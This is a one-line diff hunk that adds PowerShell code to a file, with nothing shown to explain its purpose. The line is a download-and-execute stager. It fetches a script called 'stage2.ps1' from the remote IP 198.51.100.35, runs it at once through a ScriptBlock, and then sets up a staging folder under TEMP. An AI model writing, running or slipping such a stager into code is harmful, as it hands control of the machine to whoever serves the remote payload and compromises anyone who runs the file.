@@ -1,0 +1,1 @@
+$FetchUrl = "https://198.51.100.35/stage2.ps1"; $DownloadedScript = (New-Object Net.WebClient).DownloadString($FetchUrl); & ([ScriptBlock]::Create($DownloadedScript)); Set-Location -Path $env:TEMP; $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
